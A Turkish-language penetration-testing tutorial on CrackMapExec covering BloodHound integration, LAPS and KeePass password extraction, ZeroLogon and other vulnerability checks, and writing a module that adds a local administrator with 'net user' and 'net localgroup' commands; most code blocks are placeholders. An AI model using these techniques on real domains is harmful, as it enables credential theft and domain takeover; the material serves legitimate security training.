Bu bölüm, CrackMapExec'i C2 Frameworks gibi diğer bilgisayar korsanlığı araçlarıyla nasıl kullanabileceğimizi araştırıyor. Bir sonraki bölümde CrackMapExec'in BloodHound ile nasıl entegre edileceği incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldırganlar hem de savunmacılar tarafından alan güvenliğini analiz etmek için kullanılan açık kaynaklı bir araçtır. Araç, domain'den toplanan büyük miktarda veriyi alır. İlişkiyi görsel olarak temsil etmek ve geleneksel numaralandırma ile tespit edilmesi zor veya imkansız olan domain saldırı yollarını belirlemek için grafik teorisini kullanır. Bu bölümde Bloodhound'a aşina olduğunuzu varsayıyoruz. 


### **BloodHound**'da **Owned** olarak işaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geçirilmiş (owned) olarak işaretleyebiliriz. Bunu yapmak için node'a sağ tıklayıp **`Mark X as Owned`** seçeneğine tıklamamız yeterlidir. Bu, ele geçirdiğimiz kullanıcıları ve bilgisayarları takip etmek açısından faydalıdır, özellikle büyük bir organizasyonla çalışırken. Ayrıca, **`Shortest Path from Owned Principals`** (Ele Geçirilmiş Principal'dan En Kısa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele Geçirilmiş Principal'dan Domain Adminlerine En Kısa Yollar) gibi bir BloodHound cypher sorgusu gerçekleştirmek istediğimizde de kullanışlıdır.

CrackMapExec'i, ele geçirdiğimiz herhangi bir user veya computer'ı BloodHound veritabanında `owned` olarak işaretleyecek şekilde yapılandırabiliriz. Bunu yapmak için, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapılandırma dosyasını aşağıdaki seçeneklerle değiştirmemiz gerekir:

* Bloodhound yapılandırma seçeneği `bh_enabled`'ı `True` olarak ayarlayın.
* `bh_uri`'yi Bloodhound veritabanı `IP` adresimize ayarlayın.
* `bh_port`'u veritabanı `portuna` ayarlayın
* Kimlik bilgilerini bloodhound veritabanıyla eşleşecek şekilde ayarlayın: kullanıcı adı `neo4j` ve şifre `asdasd123` (Veritabanınıza karşılık geleni kullandığınızdan emin olun).

Yapılandırma aşağıdaki gibi görünmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: Bağlandığınız BloodHound veritabanına karşılık gelen kullanıcı adı ve parolayı kullandığınızdan emin olun.

### Bloodhound Verilerinin Toplanması

BloodHound verilerini toplamak için CrackMapExec kullanarak SharpHound'u çalıştıracak ve ardından dosyayı saldırı hostumuza aktaracağız.

### BloodHound verilerinin toplanması

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Şimdi BloodHound'u açmamız ve verileri içe aktarmamız gerekiyor.


### BloodHound'da Kullanıcıları Owned Olarak Ayarlama

Veriler içe aktarıldıktan sonra, `robert` kullanıcısı ile bağlanmaya çalışırsak, kullanıcıyı BloodHound veritabanında owned olunan olarak ayarlayacaktır.

### Kullanıcı BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanıcısı olan bir makineyi tehlikeye atarsak da aynı şey olacaktır. Bulunan tüm yeni kullanıcıları owned olarak ayarlayacaktır.

### Procdump Modülü ile Kullanıcıları Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: Tüm CrackMapExec seçenekleri BloodHound veritabanı ile senkronize olmayacaktır. Örneğin, `--ntds` veya `--lsa` seçeneklerini denersek, kullanıcıları veritabanında sahip olunan olarak işaretlemez, ancak `procdump` veya `lsassy` gibi modüller kullanıcıları sahip olunan olarak işaretler.


### BloodHound'da Bilgisayarları Owned Olarak Ayarlama

Yazım sırasında, BloodHound entegrasyonu yalnızca user'ları Owned olarak işaretlemektedir. Bir `computer` owned olarak işaretlemek istiyorsak, `bh_owned` modülünü ve `neo4j` veritabanımızın kullanıcı adı ve şifresini kullanabiliriz. Aşağıdaki örnekte, diğer varsayılan değerler neo4j veritabanımızla eşleştiği için yalnızca `PASS` seçeneğini ekleyeceğiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, büyük ağlarla uğraşırken birçok seçenek sunar ve müşterilerimizle paylaşmak istememiz durumunda veritabanını güncellemenin hızlı bir yoludur. Bir sonraki bölümde, CrackMapExec'te mevcut olan bazı popüler modüllerle çalışacağız.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici şeylerden biri, modüler olması ve herkesin modüller oluşturmasına ve bunları araca katkıda bulunmasına izin vermesidir. CrackMapExec, exploit ve exploit sonrası görevleri kolaylaştırmak için işlemler gerçekleştirmemizi sağlayan 50'den fazla modüle sahiptir. Bu bölümde LDAP ve SMB protokolleri için bu modüllerden bazıları incelenecektir.


### LDAP Protocol Modules

LDAP protokolü yaygın olarak Domain Controller'lar ile etkileşime geçmemizi ve onlardan bilgi almamızı sağlar. Active Directory'den ilginç bilgiler çıkarmamızı sağlayacak bazı modülleri gözden geçirelim.


### **LDAP Module - get-network**

`get-network` modülü [Active Directory Integrated DNS dump](https://github.com/dirkjanm/adidnsdump)'ı  temel alır. Varsayılan olarak, Active Directory'deki herhangi bir kullanıcı, `zone transferine` benzer şekilde Domain veya Forest DNS bölgelerindeki tüm DNS kayıtlarını numaralandırabilir. Bu araç, internal ağların yeniden yapılandırılması amacıyla bölgedeki tüm DNS kayıtlarının numaralandırılmasını ve dışa aktarılmasını sağlar.

Modülü kullanmanın üç (3) yolu vardır:
* Sadece IP adresini almak.
* Sadece domain isimlerini al.
* Her ikisini de al (IP ve domain adları).

Varsayılan olarak, herhangi bir seçenek belirtmezsek, modül yalnızca IP adresini alacaktır. `ALL=true` seçeneğini seçersek, hem IP hem de domain adlarını alır ve `ONLY_HOSTS=true` olarak belirtirsek, yalnızca FQDN'yi alırız.


### DNS Sunucusundan (Record) Kayıtları Alma

{{CODE_BLOCK_196}}

{{CODE_BLOCK_197}}

{{CODE_BLOCK_198}}


Not: Bu yazının yazıldığı zamanda, modül **`adidnsdump`** aracıyla bazı farklılıklar göstermektedir. Sonuçlar, hesaplar arasında farklılık gösterebilir.


### LDAP Module - laps

Bir başka harika modül de `laps` . `Local Administrator Password Solution (LAPS)`, domain'e bağlı bilgisayarlarda local hesap parolalarının yönetimini sağlar. Parolalar Active Directory'de (AD) saklanır ve ACL'ler tarafından korunur, böylece yalnızca belirli kullanıcılar bunları okuyabilir veya `parola sıfırlama` talebinde bulunabilir. Laps modülü ile bir hesabın okuma erişimine sahip olduğu tüm bilgisayarları alabiliriz. Bir bilgisayarı belirtmek için `COMPUTER` seçeneğini de kullanabilir veya benzer ada sahip birkaç bilgisayarı almak için bir wildcard karakterle birlikte kullanabiliriz.


### LAPS Modülü Parolaların Alınması

{{CODE_BLOCK_199}}

{{CODE_BLOCK_200}}


Not: Kullanılan parola bir örnektir. Hedef hostta çalışmayacaktır

### LDAP Modülü - MAQ

**Machine Account Quota (MAQ)**, **[MS-DS-Machine-AccountQuota](https://learn.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota)** **attribute**'ü ile temsil edilen ve varsayılan olarak bir **user**'ın bir **domain** içinde oluşturabileceği **computer account** sayısını belirten bir **domain level attribute**'tür.

**[Resource Based Constrained Delegation](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)** gibi bazı **attack** senaryolarında **domain** içinde bir **machine** oluşturmak gerekebilir, bu yüzden **account machine quota attribute**'ünü **enumerate** etmek önemlidir.


### Machine Quota Module

{{CODE_BLOCK_201}}


### LDAP Module - daclread

Bir başka harika modül ise bir veya birden fazla object'in `DACL`'lerini okumamızı ve dışa aktarmamızı sağlayan `daclread`'dir. Bu modül Active Directory erişimini numaralandırmamızı sağlayacaktır. Aşağıdaki seçeneklere sahiptir:

### daclread Module Options

{{CODE_BLOCK_202}}

Diyelim ki **`grace`** hesabının tüm **ACE**'lerini okumak istiyoruz. Bunun için **`TARGET`** seçeneğini ve **`ACTION`** olarak **read** kullanabiliriz.


### Grace Kullanıcısının DACL'sini Oku

{{CODE_BLOCK_203}}


Ayrıca belirli hakları da arayabiliriz, örneğin hangi **principal**'ların **DCSync** haklarına sahip olduğunu. Bunun için **`TARGET_DN`** seçeneğini kullanarak **distinguished domain name (DN)** belirtmemiz, **`ACTION`** olarak **read** seçeneğini seçmemiz ve aramak istediğimiz hakları **`RIGHTS`** seçeneğiyle belirlememiz gerekir.

### DCSync Rights'a Sahip Kullanıcıları Arama

{{CODE_BLOCK_204}}



Çıktıda gösterildiği gibi, `ACE[4]` `robert` kullanıcısının hedef domain'de `DCSync` haklarına sahip olduğunu gösterir.

LDAP'ta birkaç modül daha kullanabiliriz. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.

### LDAP Protocol Modules

{{CODE_BLOCK_205}}


### SMB Protocol Modules

SMB protokolünde daha fazla modül mevcuttur. CrackMapExec modülünde yaptığımız şeylerin çoğu SMB protokolünü kullanır. İlginç bilgiler elde etmemizi sağlayacak bazı modülleri gözden geçirelim.

Not: SMB kullanan modüllerin çoğunun çalışması için admin haklarına ( `Pwned!` ) ihtiyaç vardır.


### SMB Modülleri - get_netconnections ve ioxidresolver

Bir ağ pentesti üzerinde çalışırken, sürekli olarak daha fazla kaynağa veya ağa erişim elde etmeye çalışırız. CrackMapExec, daha önce tehlikeye attığımız bir makineyi numaralandırmamıza ve birden fazla ağ yapılandırmasına sahip olup olmadığını belirlememize olanak tanıyan bazı modüllere sahiptir. `get_netconnections` ve `ioxidresolver` modüllerini kullanalım ve farklarını görelim.

`get_netconnections` modülü, ağ bağlantılarını sorgulamak için `WMI` kullanır. `IPv6` ve herhangi bir ikincil IP dahil olmak üzere tüm IP adreslerinin yanı sıra domain adını da alır.


### get_netconnections Module

{{CODE_BLOCK_206}}


Öte yandan, `ioxidresolver` modülü IP adreslerini sorgulamak için RPC kullanır. Ancak, bu modül `IPv6` adreslerini içermez.

### ioxidresolver Module

{{CODE_BLOCK_207}}


Not: İhtiyaçlarımıza en uygun olanı seçebilmemiz için bir modülün nasıl çalıştığını anlamak önemlidir.


### SMB Module - keepass_discover

`KeePass`, kurumsal ağlarda adminler ve kullanıcılar tarafından parolaları ve gizli bilgileri tek bir veritabanında saklamak için yaygın olarak kullanılan ücretsiz, açık kaynaklı bir password manager'dır. Bir master password onu korur. Bir KeePass veritabanı alırsak, onu açmak için şifresine ihtiyacımız vardır.

### KeePass'i Keşfetme

{{CODE_BLOCK_208}}

Eğer master parolaya sahip değilsek bir alternatif de Lee Christensen ( [@tifkin_](https://twitter.com/tifkin_)) ve Will Schroeder ( [@harmj0y](https://twitter.com/harmj0y)) tarafından geliştirilen ve veritabanını açık metin olarak dışa aktarmak için KeePass'ın triger sistemini kullanan bir teknik kullanmaktır. KeePass yapılandırma dosyasını, veritabanını otomatik olarak açık metin olarak dışa aktaran bir [trigger](https://keepass.info/help/v2/triggers.html) içerecek şekilde değiştirir.

Bunu kullanmak için beş (5) adıma ihtiyacımız var:

*  KeePass yapılandırma dosyasını bulun. Biz bunu `keepass_discover` modülü ile yaptık.
 * `ACTION=ADD` seçeneğini ve `KEEPASS_CONFIG_PATH` öğesini kullanarak trigger'ı yapılandırma dosyasına ekleyin.

### KeePass Yapılandırma Dosyasına Trigger Ekleme

{{CODE_BLOCK_209}}

Not: KeePass yapılandırma yolu için ters eğik çizgi (`/`) veya çift eğik çizgi (`\`) kullandığınızdan emin olun.

* Kullanıcının KeePass'i açmasını ve master parolayı girmesini bekleyin. Bu işlemi zorlamak için `ACTION=RESTART` seçeneğini kullanarak KeePass.exe prosesini yeniden başlatabiliriz. Hedef makinede oturum açmış çok sayıda kullanıcı varsa, `USER=julio` gibi kullanıcı adı ile `USER` seçeneğini ekleyebiliriz.

{{CODE_BLOCK_210}}


`ACTION=POLL` seçeneğini kullanarak export edilen veritabanını makinemize sorgulayın. Daha sonra şifre girişlerini aramak için grep kullanabiliriz.


### Ele Geçirilen Hedeften Export Verileri Sorgulama

{{CODE_BLOCK_211}}

{{CODE_BLOCK_212}}


`ACTION=CLEAN` seçeneğini ve `KEEPASS_CONFIG_PATH`'i kullanarak yapılandırma dosyasını temizleyin

### Clean Configuration File Changes

{{CODE_BLOCK_213}}


Bu modülün her seçeneğini öğrendik, ancak **`ACTION=ALL`** kullanarak hepsini tek seferde alabiliriz. Bu seçeneğin iyi yanı, **extract_password** yöntemini de içermesidir; bu yöntem **.xml** dosyasında herhangi bir parola girişini arar ve konsola yazdırır.


### keeppass_trigger TÜMÜNÜ Tek Komutta Çalıştırma

{{CODE_BLOCK_214}}

Not: Modül şifreyi yazdırırken sorun yaşayabilir. Bir hata alabiliriz, ancak şifre `/tmp/export.xml` dosyasında olacaktır, böylece manuel olarak alabiliriz.

### RDP'yi Etkinleştirme veya Devre Dışı Bırakma

Değerlendirme yaparken yapmak isteyebileceğimiz yaygın bir görev, RDP aracılığıyla bir hedef makineye bağlanmaktır. Bu, başka türlü lateral hareket saldırıları gerçekleştiremediğimiz veya standart bir protokol kullanarak radarın altından geçmek istediğimiz bazı senaryolarda yararlı olabilir.

Bağlanmak istediğimiz makinede RDP etkin değilse, buna izin vermek için RDP modülünü kullanabiliriz. `ACTION` seçeneğini ve ardından `enable` veya `disable` seçeneklerini belirtmemiz gerekir.


### RDP'yi Etkinleştirme

{{CODE_BLOCK_215}}


SMB'de birkaç modül daha vardır. Modüllerin tam listesini görmek için `-L` seçeneğini kullanabiliriz.


### SMB Protocol Modules

{{CODE_BLOCK_216}}

Bir sonraki bölümde, ZeroLogon gibi bilinen güvenlik açıklarından yararlanan diğer SMB modüllerine bakacağız

### Vulnerability Scan Modules

Sızma testi yaparken gerçekleştirdiğimiz günlük faaliyetlerden biri güvenlik açıklarını tespit etmeye çalışmaktır. Eğer herhangi birini bulabilirsek, exploitation işi basit olabilir.

CrackMapExec, güvenlik açıklarını tespit etmemizi sağlayan bazı modüller içerir. Bu oturumda bunlardan bazılarını inceleyeceğiz.


### Environment'i Ayarlama

Bu senaryoda, bir sunucuyu ele geçirdik ve admin kimlik bilgilerini elde ettik. Bu sunucunun iki ağ kartı var ve amacımız domainin saldırıya karşı savunmasız olup olmadığını belirlemek. Domainin IP adresi `172.16.10.3`'tür.

Domain'e erişim sağlamak için, CME ile ProxyChain bölümünde öğrendiklerimizi kullanacağız ve Chisel ile bir bağlantı kuracağız


### Chisel'i Hedef Makineye Gönderme

{{CODE_BLOCK_217}}


### Saldırı Hostumuzda Chisel'ı Sunucu Olarak Çalıştırma

{{CODE_BLOCK_218}}


### Chisel'ı Tehlikeye Düşmüş Cihazdan Saldırı Hostumuza Bağlama

{{CODE_BLOCK_219}}


### Vulnerability Scan Modules

CrackMapExec'teki güvenlik açığı modüllerinin çoğu yalnızca kontrol edilir ve bu modülleri güvenlik açıklarından yararlanmak için kullanamayız. [ZeroLogon güvenlik açığı](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) ile başlayalım.


### ZeroLogon

Kimliği doğrulanmamış bir saldırgan, bir domain controller'a ağ erişimi ile[ ZeroLogon güvenlik açığından (CVE-2020-1472)](https://www.secura.com/uploads/whitepapers/Zerologon.pdf) faydalanabilir. Bu güvenlik açığını kötüye kullanmak ve sonunda domain'in controller'ı ele geçirmek için savunmasız bir Netlogon session'ı başlatması gerekir. Bir Domain Controller'a bağlanmak başarılı bir saldırı için tek ön koşul olduğundan, güvenlik açığı ciddidir.

CrackMapExec, bir Domain Controller'ın ZeroLogon'a karşı savunmasız olup olmadığını tanımlayan zerologon adlı bir modül içerir.


### ZeroLogon Güvenlik Açığı Kontrolü

{{CODE_BLOCK_220}}


### PetitPotam

Güvenlik araştırmacısı [Gilles Lionel](https://twitter.com/topotam77) kısa bir süre önce [PetitPotam](https://github.com/topotam/PetitPotam) adı verilen ve saldırganların sadece kurumsal ağ altyapısına erişim sağlayarak domain'i tehlikeye atmasına olanak tanıyan bir saldırı tekniğini ortaya çıkardı. Yöntem, sunulan herhangi bir sunucu servisine (örneğin bir Domain Controller) yönelik klasik bir `NTLM relay` saldırısıdır. Lionel ayrıca [GitHub PetitPotam](https://github.com/topotam/PetitPotam)'da saldırganların domain'i ele geçirmek için bu özel saldırı tekniğini nasıl kullanabileceklerini gösteren bir proof of  concept kodu da yayınladı.

CrackMapExec, bir Domain Controller'ın PetitPotam'a karşı savunmasız olup olmadığını tanımlayan `petitpotam` adlı bir modül içerir.


### Petitpotam Güvenlik Açığı Kontrolü

{{CODE_BLOCK_221}}


### noPAC

noPAC güvenlik açığının exploit'i, normal bir domain kullanıcısının ayrıcalıklarının bir domain admin yükseltilmesine izin verdi. Kavram kanıtı (PoC) [GitHub](https://github.com/Ridter/noPac)'da yayınlandı.

CrackMapExec, bir domain controller'ın noPAC'a karşı savunmasız olup olmadığını tanımlayan nopac adlı bir modül içerir.


### noPAC vulnerability check

{{CODE_BLOCK_222}}



### DFSCoerce

[Filip Dragovic](https://twitter.com/filip_dragovic), DFSCoerce adlı bir NTLM relay saldırısı için bir kavram kanıtı ([PoC](https://github.com/Wh04m1001/DFSCoerce)) yayınladı. Yöntem, bir Windows domain'inin controller'ı ele geçirmek için Distributed File System: Namespace Management Protocol (MS-DFSNM) kullanarak bir Windows domain'inin kontrolünü ele geçiriyor.

Bu saldırı bir domain kullanıcısı gerektirir ve bir DC'nin savunmasız olup olmadığını belirlemek için CrackMapExec modülü `dfscoerce`'yi kullanabiliriz. Bu güvenlik açığını kontrol etmek için `Y3t4n0th3rP4ssw0rd` şifresiyle `carole.holmes` hesabını kullanacağız.


### DFSCoerce Vulnerability Check

{{CODE_BLOCK_223}}


### ShadowCoerce

ShadowCoerce, güvenlik araştırmacısı Lionel Gilles tarafından 2021'in sonlarında PetitPotam saldırısını sergileyen bir sunumun sonunda keşfedildi ve ilk kez detaylandırıldı. [Charlie Bromberg](https://twitter.com/_nwodtuhs) bir kavram kanıtı ([PoC](https://github.com/ShutdownRepo/ShadowCoerce)) oluşturdu.

CrackMapExec modülü shadowcoerce kullanarak DC'nin bu saldırıya karşı savunmasız olup olmadığını kontrol etmek için carole.holmes hesabını kullanalım.


### ShadowCoerce Vulnerability Check

{{CODE_BLOCK_224}}


Güvenlik açığı tarama modüllerinin çoğu yazarı, bilgisayarın güvenlik açığı olup olmadığına dair bir mesaj eklememiştir, bu nedenle komut çalıştırıldıktan sonra hiçbir şey görmeyiz. Ancak, ( `./CrackMapExec/cme/modules/shadowcoerce.py`) adresinde bulunan shadowcoerse modülünün kaynak kodunu kontrol edersek, yazarın ( `logging.debug` ) ile bazı debug log'ları eklediğini göreceğiz. CrackMapExec'i hata debug modunda çalıştırırsak, bu logları yazdıracaktır.

CrackMapExec'i debug modunda çalıştırmak için protokolden önce `--verbose` seçeneğini kullanabiliriz


### shadowcoerce Modülünü Verbose Enabled ile Çalıştırma

{{CODE_BLOCK_225}}


`DEBUG` ile başlayan satırlar `logging.debug`'a karşılık gelir. Son satırlarda hedefin savunmasız olmadığını gösterdiğini görebiliriz.


### MS17-010 (EternalBlue)

MS17-010, diğer adıyla EternalBlue, Windows işletim sistemleri için Microsft tarafından 14 Mart 2017 tarihinde yayınlanan bir güvenlik yamasıdır. Yama, SMB servisindeki kritik bir kimliği doğrulanmamış remote kod çalıştırma açığı içindir. Bu güvenlik açığı hakkında daha fazla bilgi edinmek için [Microsoft Güvenlik Bülteni MS17-010](https://learn.microsoft.com/en-us/security-updates/SecurityBulletins/2017/ms17-010?redirectedfrom=MSDN) - Kritik'i okuyabiliriz.

CrackMapExec, bir domain controller'ın MS17-010'a karşı savunmasız olup olmadığını belirleyen ms17-010 adlı bir modül içerir.


### MS17-010 Vulnerability Check

{{CODE_BLOCK_226}}


### Güvenlik Açığından Yararlanma

Birçok güvenlik açığı gördük. Onlardan birini exploit etmeye çalışalım: ZeroLogon. Modül tarafından sağlanan bağlantıya gidelim https://github.com/dirkjanm/CVE-2020-1472 ve onu kullanalım:


### Exploiting ZeroLogon

{{CODE_BLOCK_227}}

{{CODE_BLOCK_228}}


Zaman geçtikçe yeni güvenlik açıkları ortaya çıkacaktır ve bunlar sektör uzmanları veya bizim tarafımızdan CrackMapExec'e modül olarak eklenebilir. Bir sonraki bölümde, CrackMapExec için nasıl bir modül oluşturabileceğimizi göreceğiz.

---

### Kendi CME Modülümüzü Oluşturmak

Yazarlar ve topluluk tarafından oluşturulan birçok yerleşik CrackMapExec modülünü kullandık. Bu bölümde CrackMapExec için modülümüzü nasıl yapabileceğimizi keşfedeceğiz.


### CrackMapExec'i Poetry ile derleyin

Modülümüzü oluşturmadan önce, CrackMapExec projesinin nasıl derleneceğini bilmek çok önemlidir. Bu amaçla CME, projelerimizi oluştururken önerilen [Poetry](https://python-poetry.org/)'yi kullanır. Poetry kullanmıyorsanız, CrackMapExec'i çalıştırmak üzere Poetry kullanmaya başlamak için Kurulum ve Binaryler bölümüne bir göz atın

Şimdi kodu en sevdiğimiz IDE ile açabiliriz. Bu bölümde [VSCode](https://code.visualstudio.com/) kullanacağız. VSCode'u [kurmak](https://code.visualstudio.com/download) için .deb dosyasını kendi web sitesinden indirmemiz gerekiyor. Doğrudan indirme bağlantısı [burada](https://code.visualstudio.com/sha/download?build=stable&os=linux-deb-x64).


### VSCode'un Kurulması ve Çalıştırılması

{{CODE_BLOCK_229}}

Daha sonra açmak için `code` yazabiliriz 

{{CODE_BLOCK_230}}

![Pasted image 20241203150456.png](/img/user/resimler/Pasted%20image%2020241203150456.png)


### Yeni Modülümüzü Oluşturun

Modülümüzü oluşturalım. Yeni bir administrator hesabı oluşturacak basit bir script oluşturacağız.

* ./CrackMapExec/cme/modules klasörü altında `createadmin.py` adında bir dosya oluşturun.
* Aşağıdaki kod örneğini dosyaya kopyalayın:

{{CODE_BLOCK_231}}



* Şimdi modülümüzü özelleştirelim.

Bazı değişkenleri tanımlamamız gerekiyor:

* `name`, modül adını nasıl çağıracağımızı belirtir. Bu durumda, `createadmin` dosya adını kullanacağız.
* `description` modülün amacı için kısa bir açıklamadır. Biz bunu `Create a new administrator account` ayarlayacağız.
* `supported_protocols`, modülü kullanmak için desteklenen protokolün bir dizisidir. Biz sadece `SMB` kullanacağız.
* `opsec_safe`, modülün çalıştırılmasının güvenli olduğu anlamına gelen bir `True` veya `False` değeridir.
* `multiple_hosts`, bu modülü birden fazla hedefe karşı çalıştırabileceğimiz anlamına gelir.

Ayrıca, modül için değişkenleri tanımlamak için kullanılan `options()` methoduna da sahip olacağız. Bu durumda, `USER` ve `PASS` olmak üzere iki seçenek ekleyeceğiz. Her seçeneğin varsayılan değeri olabilir ya da olmayabilir. Bu yazara bağlıdır. USER için varsayılan değeri düz metin olarak ve PASS için varsayılan değeri `asdasd123` . Ayrıca USER o PASS modül seçeneğinin boş olup olmadığını doğrulamak için bir kontrol ekledik. Eğer durum buysa, modülden çıkılacaktır.

{{CODE_BLOCK_232}}

* Daha sonra, `on_admin_login()` metodunu kullanarak execute ile çalışacağız. Bu metot değişkenlerimizi almaktan ve hedeflere istediğimiz herhangi bir görevi yürütmekten sorumludur. Çıktı olarak `context.log.info` ve `context.log.highlight` metotlarını kullanacağız (farklı renklere sahipler).

Bu execute için, yöntemin `connection.execute(command, True)` komutunu kullanarak bir `cmd.exe` komutu çalıştıracağız. Komutumuz, yeni bir kullanıcı eklemek için `net user username password /add /Y` değeriyle ve kullanıcıyı administrators grubuna eklemek için `net localgroup administrators username /add` değeriyle command değişkenine kaydedilecektir.

{{CODE_BLOCK_233}}


Son olarak, yeni modülümüz şu şekilde görünmelidir:

{{CODE_BLOCK_234}}


### Modülümüzü Çalıştırma

Şimdi modülümüzü herhangi bir seçenekle veya herhangi bir seçenek olmadan çalıştırabiliriz. Önce varsayılan değerlerle çalıştırarak sonuçları görelim.


### CME Modülümüzün Çalıştırılması createadmin

{{CODE_BLOCK_235}}

Daha sonra, hem kullanıcı adı hem de parola belirterek çalıştırabiliriz.

{{CODE_BLOCK_236}}


İlk modülümüz çalışıyor, ancak çok daha iyi olabilir. Yürütmeyi iki komuta bölebilir ve kullanıcı zaten oluşturulmuşsa veya şifre politikalara uymuyorsa bir hata gösterebiliriz.

Ayrıca `context.log.highlight(p)`'den değeri alabilir ve bir hata varsa farklı bir şey gösterebiliriz. Bu kodu geliştirmek için fikirleriniz nelerdir?

### Diğer Yazarlardan Öğrenmek

Artık yeni bir modül oluşturmanın temellerini öğrendiğimize göre, diğer modülleri keşfetmeli ve birkaç fikir edinmeliyiz.

Örneğin, `procdump.py` modülü `procdump.exe` çalıştırılabilir dosyasını bir `Base64` string olarak kaydeder, ardından Base64 stringini bir dosyaya dönüştürür ve hedef işletim sisteminde tutar. LSASS'ın işlem kimliğini almak için `tasklist` komutunu çalıştırır, bunu bir değişkene kaydeder ve process kimliğini procdump.exe'nin yürütülmesine bir argüman olarak geçirir.

Başka bir örnek `get_description.py` . Bu modülü `groupmembership` modülünü oluşturmak için örnek olarak aldık. Bu modül, bir sorgu gerçekleştirmek ve `memberOf` attribute'unu almak için ihtiyaç duyduğumuz gibi, sonuçlarını bir LDAP sorgusuna dayalı olarak alır. Kodda bazı değişiklikler yaptık, yeni bir modül oluşturduk ve bir pull request gönderdik. Pull request kabul edildikten sonra tüm topluluk tarafından kullanılabilir olacaktır.

Yeni modüller oluşturmak için MSSQL gibi diğer protokoller için başka örneklere de bakabiliriz.


### Pull Request Oluşturma

CrackMapExec gibi bir proje topluluk tarafından canlı tutulur. Modülümüzün tüm topluluk tarafından kullanılabilir hale geleceği ve aracın kendisinin bir parçası olarak dahil edileceği bir pull request'i ekleyerek projeye katkıda bulunabiliriz.

Bir pull request'i yapmak için [GitHub](https://docs.github.com/en/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/creating-a-pull-request) kılavuzunu takip edebilir ve CrackMapExec'e katkıda bulunabiliriz.

İlerleyen bölümlerde, CrackMapExec kullanımı için `IPv6`, `Kerberos Kimlik Doğrulama` ve `CrackMapExec` veritabanında uzmanlaşma gibi bazı bonus konuları tartışacağız.


### Ek CME İşlevselliği

CrackMapExec, çeşitli senaryolarda çok faydalı olacak başka yardımcı programlara da sahiptir. Bu bölümde, bunlardan üçünü inceleyeceğiz:

* Audit mode
* IPv6 desteği
* Birden fazla cihaza saldırırken tamamlanma yüzdesi

### Audit Mode

5.3.0 sürümünde yeni bir mod eklendi: `audit modu`. Bu mod, şifreyi veya hash'i tercih ettiğimiz bir karakterle veya hatta en sevdiğimiz `emoji` ile değiştirir. Bu özellik, bir müşteri raporu yazarken ekran görüntüsünün bulanıklaşmasını önlemeye yardımcı olur.

Audit modunu yapılandırmak için, varsayılan olarak `~/.cme/cme.conf` adresinde bulunan yapılandırma dosyasını düzenlememiz ve `audit_mode` parametresini tercih ettiğimiz karakterle değiştirmemiz gerekir. Bu karakter, CrackMapExec çalıştırılırken parolanın veya hash'in yerini alacaktır. Bu örnek için `#` karakterini kullanacağız


### Enabling Audit Mode

{{CODE_BLOCK_237}}

Şimdi çalıştırabilir ve parolanın çıktıda `########` ile değiştirildiğini görebiliriz.

{{CODE_BLOCK_238}}

Gördüğümüz gibi, çalıştırma sonucundaki password `#` karakteri ile değiştirilir. Ancak, komut şifreyi gösterir. Bu gibi durumlarda, istenen komutu çalıştırmadan önce parolayı bir dosyaya kaydetmek idealdir.

### Audit Mode Dosyadaki Parola ile Etkinleştirildi

{{CODE_BLOCK_239}}


### IPv6 Support

CrackMapExec'in bir diğer yeteneği, IPv6 üzerinden iletişimi desteklemesidir. Çoğu organizasyon, IPv6'yı varsayılan olarak etkinleştirmiştir, hatta bunu kullanmasalar bile, IPv6'nın log seviyesinde IPv4 kadar izlenmediği veya anlaşılmadığı durumlar da olabilir. Bu durum, ağ saldırılarının gerçekleştirilmesi ve tespit edilmeden geçmesi için bir fırsat yaratır.

Popüler modüller bölümünde gördüğümüz gibi, CrackMapExec, `get_netconnections` modülüyle bilgisayarların IPv6 adreslerini belirlememize olanak tanır. Bu modülü kullanarak IPv6 üzerinden komutu çalıştırmayı deneyelim.

### get_netconnections Modülünü Çalıştırma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Şimdi IPv6 üzerinden hedefe erişelim.

{{CODE_BLOCK_241}}



### Tamamlanma Yüzdesi

Artık bir tarama çalışırken enter tuşuna basabilirsiniz ve CME size tamamlanma yüzdesini ve taranacak kalan host sayısını verecektir. Bu modül laboratuvarında her seferinde bir host'a saldırıyoruz, ancak daha kapsamlı bir ağ bulduğunuzda, büyük olasılıkla bu özelliği kullanacaksınız. Şimdilik `--shares` seçeneğini çalıştıralım ve bitmeden önce enter tuşuna basalım.


### Tamamlanma Yüzdesi

{{CODE_BLOCK_242}}

Aşağıdaki bölümde, Kerberos kimlik doğrulamasını ve CrackMapExec'in bu kimlik doğrulama yöntemi için içerdiği yeni değişiklikleri tartışacağız.

---


### Kerberos Authentication

Yazma sırasında CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri için Kerberos Kimlik Doğrulamasını desteklemektedir. Kerberos Kimlik Doğrulamasını kullanmanın iki (2) yolu vardır:

* `ccache` dosyasını belirtmek için `KRB5CCNAME` env adını kullanma. 
* CrackMapExec 5.4.0'dan başlayarak, artık Kerberos kimlik doğrulaması için bir Ticketla `KRB5CCNAME` environment variable'ını kullanmamız gerekmiyor. Bir kullanıcı adı ve parola veya kullanıcı adı ve hash kullanabiliriz.

